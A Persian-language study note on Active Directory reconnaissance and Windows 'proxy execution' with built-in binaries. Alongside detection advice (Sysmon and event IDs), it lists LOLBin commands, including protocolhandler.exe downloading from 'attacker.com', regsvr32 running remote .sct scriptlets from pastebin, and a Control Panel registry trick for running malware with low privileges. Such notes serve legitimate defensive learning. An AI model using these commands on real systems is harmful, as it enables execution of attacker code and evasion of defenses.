

دستورات مهم ldap

```ldap
&(samaccounttype=268435456) ) all groups in AD

(&(samaccounttype=536870912) ) bultin groups

&(samaccounttype=805306369) ) machine accounts

((objectclass=domain))

(&(objectcategory=grouppolicycontainer) ) all the policy objects

(&(serviceprinciplename =* )) accounts with spn
```



### PSLogon

یکی دیگر از ابزار هایی که وجود داره و برای فرایند Recon استفاده میشه ابزار PSlogon هستش که یکی از ابزار ها از مجموعه ابزار های sysinternals هست

![[Pasted image 20260607153043.png]]


مثلا میتونه لیست کاربر هایی که تو سیستم لاگین هستن رو نشون بده  و.........

 ![[Pasted image 20260607153131.png]]


![[Pasted image 20260607153146.png]]

در تصویر دوم داره بهمون میگه کی رو سیستمی که بهم گفتی لاگینه 

#### نکته : این ابزار با LDAP کار نمیکنه

این ابزار میاد کلید های ریجستری رو اسکن میکنه **HKEY_USERS** و هر sid که هست رو به ما نشون میده 
این ابزار از یک API هم استفاده میکنه تحت عنوان _NetSessionEnum_ 

### Hunting 


این ابزار همونطور که گفتیم میاد از ریحستری استفاده میکنه 
یعنی میاد از Remote Registry استفاده میکنه پس ما رو سیستم مقصد باید به دنبال **EventID6145** باشیم 
که share مربوط به **winreg** باشه یعنی winreg نشون دهنده remote registry هستش 
و EventID 4624 و همچنین **EventID 12 sysmon** 
ئر سیستم مبدا باید به دنبال EventCode 18 تو sysmon بگردیم که اشاره به همون PipeName Winreg میکنه 
این لاگ ها باید در یک بازه زمانیه به شدت کوتاه باشه تا بتونیم باهم corolate کنیم 

![[Pasted image 20260607155004.png]]

###### اما از کجا بفهمیم که این API یعنی NetSessionEnum استفاده شده ؟؟؟ با استفاده از ابزار API Monitor باید رو برنامه attach کنیم 

---

بیشتر ابزار ها از این API netsession استفاده میکنن گه  PipeName خاص خودش رو دارد 

![[Pasted image 20260607155054.png]]

### NamedPipe ---> lsarpc


---

# Execution

```
UAC bypass

application whitelisting

AV/EDR ---> bypass

policy -- > sign

applocker

execution
```

این مرحله مهاجم هرکاری میکنه تا بیاد و کاری که مد نظرش هست رو به نوعی اجرا کنه 

یکی از بهترین ابزار هایی که هستش ابزار های builtin خوده ماکروسافت هست که در اصطلاح همون LOLBINS نام دارد 

مهاجم ها هیچ وقت malware هاشون رو به صورت مستقیم اجرا نمیکنن بلکه از تکنیکی استفاده میکنن تحت عنوان Proxy Execution 


###  Proxy Execution

ما یه سری com object داریم که این com object ها میان parent برنامه رو به نوعی redirect میکنن به برنامه یی که ما مد نظرمون هست مثلا **ShellWindow** یکی از این com object ها هست 

حالا یکی از Lolbins هایی که برای انجام اینکار وجود داره forfiles هستش که APT 28 ازش استفاده میکرد 

```
forfiles /p c:\windows\system32 /m svchost.exe /c "malware.exe"
```

```
rundll32.exe zipfldr.dll RouteTheCall calc.exe
```


یکی دیگر مربوط به یه dll به اسم zipfldr.exe که تابع RouteTTheCall میاد برای همینکار رو انجام میده 


یکی دیگر از dll هایی که وجود داره 

```
ieframe.dll -- > function -- > OpenURL
URL---> file:///c:\windows\system32\calc.exe
```

این Dll برای ترجمه html code ها هستش که از این فانکشنش هم میشه سو استفاده کرد حالا چطوری میشه از این استفاده کرد 

```
file:///c:\windows\system32\calc.exe
```

این رو ما میزاریم داخل یه فایل با پسوند **.url** 

```
rundll32.exe ieframe.dll,OpenURL c:\users\calc.exe
```


----

## protocolhandler.exe

 تو سیستم هایی که Office نصب شده باشه  یه برنامه یی وجود دارد تحت عنوان protocolhandler.exe که به ما امکان دانلود رو میده 

```perl
c:\[office]\root\[version]\protocolhandler.exe "https://attacker.com/file.exe"
```

اما به شرطی که office رو سیستم نصب باشه 
###### این پروسه برای update خوده office هستش
-

----

پروسه بعدی که قراره بریم باهم استفاده کنیم برای همین مبیحث proxy excution استفاده میشه پروسه regsvr32.exe هستش


پروسه regsvr32 میاد برای ما به صورت Remote  یا local یه فایل رو execute میکنه 
اما هر فایلی  رو نمیتونه 
###### چه فایل هایی رو میتونه بیاد برای ما اجرا کنه ؟؟؟ فایل هایی با پسوند .sct
##### که به این فایل ها در اصطلاح  com scriptlets میگن 
SCT
**پسوند نام فایل فایل‌های کامپوننت اسکریپت (یا اسکریپت‌لت‌ها) است که شامل دستورات برنامه‌نویسی، توابع، روش‌ها و متغیرهایی است که برای خودکارسازی عملیات یا انجام وظایف تخصصی از طریق سرویس‌های کامپوننت‌ها در سیستم عامل ویندوز استفاده می‌شوند.**

![[Pasted image 20260608092436.png]]


##### Execute the specified remote .SCT script with scrobj.dll.
```
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll
```

##### Execute the specified local .SCT script with scrobj.dll.
```
regsvr32.exe /s /u /i:file.sct scrobj.dll
```

### Reference

	- https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/



## Hunting 

```
EventID 3 ----> resvr32.exe
```

اتکر ممکن است که بیاد اسم regsvr32 رو عوض کنه ولی ارگومان هاش بازم همونه پس رولی که باید براش بنویسیم بیشتر باید به ارگومان ها فوکوس کنیم 


```shell
jabber.exe /u /s /i>:http://pastebin.com/raw/H4A4iDTA .\jabber.dll
```


پس باید به دنبال EventID 3 باشیم از regsvr32 که چه network connection داره و جدا از network connection باید EventID 22 رو برسی کنیم که به چه دامنه یی زده 

![[Pasted image 20260608093620.png]]


---


یکی دیگر از دستور اتی که هست برای Proxy Execution استفاده میشه dll به اسم advpack.dll هستش

```
rund1132.exe advpack.dll, RegisterOCX calc.exe
```

```
rund1132.exe advpack.dll, RegisterOCX "cmd /c net user && calc.exe"
```

حتما در انتها باید یه فایل exe باشه 


---


یه زمانی هست که داخل سازمان PowerShell یا cmd بستش اما control panel بازه تو این شرایط ما میتونیم یه فایل با پسوند .cpl درست کنیم و در کلید ریجستری مربوطه قرار دهیم 

```
rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl
```


به این صورت می تونیم این فایل رو اجرا کنیم اما چطوری متیونیم این فایل رو بسازیم 
یک تابعی داریم تحت عنوان Cplapplet که میاد 

##### Reference
[[Code Execution through Control Panel Add-ins]]
[[Control Panel Item]]

بعد از اینکه فایل رو ساختیم به کلید ریجستری مربوطه ادش میکنیم 

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls
```

![[Pasted image 20260608095656.png]]

این کلید در مسیر HKEY_CURRENT_USER هم وجود دارد و میتونیم با سطح دسترسی low privilege هم دسترسی داشته باشیم و برنامه خودمون رو اجرا کنیم 


![[Pasted image 20260608095942.png]]

الان ما فایل مون رو اضافه کردیم وقتی که control.exe رو اجرا کنیم به راحتی malware ما هم اجرا میشه 


![[Pasted image 20260608100027.png]]


